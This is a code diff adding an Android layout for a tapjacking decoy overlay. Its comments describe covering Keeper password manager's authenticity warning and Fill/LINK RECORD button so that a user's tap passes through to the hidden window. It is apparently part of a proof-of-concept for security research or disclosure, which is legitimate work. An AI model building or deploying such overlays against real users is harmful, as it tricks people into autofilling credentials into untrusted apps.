@@ -1,0 +1,44 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!--
+    decoy overlay content added to WindowManager as a TYPE_APPLICATION_OVERLAY.
+    it deliberately covers the area where Keeper draws its "cannot validate authenticity"
+    warning and its LINK RECORD / Fill button, luring a tap that (when FLAG_NOT_TOUCHABLE is
+    set) passes through to Keeper's obscured window underneath.
+-->
+<FrameLayout xmlns:android="http://schemas.android.com/apk/res/android"
+    android:id="@+id/overlayRoot"
+    android:layout_width="match_parent"
+    android:layout_height="match_parent"
+    android:background="#FFF3E0">
+
+    <TextView
+        android:id="@+id/decoyTopBanner"
+        android:layout_width="match_parent"
+        android:layout_height="wrap_content"
+        android:layout_gravity="top"
+        android:background="#4CAF50"
+        android:padding="24dp"
+        android:text="@string/tapjacking_decoy_banner"
+        android:textColor="#FFFFFF"
+        android:textSize="20sp"
+        android:textStyle="bold" />
+
+    <TextView
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:layout_gravity="center"
+        android:padding="16dp"
+        android:text="@string/tapjacking_decoy_prompt"
+        android:textColor="#000000"
+        android:textSize="18sp" />
+
+    <!-- translationY is driven from TapJackingActivity via the "decoy vertical position" slider
+         so the button can be lined up over Keeper's Fill / LINK RECORD control -->
+    <Button
+        android:id="@+id/decoyButton"
+        android:layout_width="160dp"
+        android:layout_height="wrap_content"
+        android:layout_gravity="top|center_horizontal"
+        android:text="@string/tapjacking_decoy_button" />
+
+</FrameLayout>
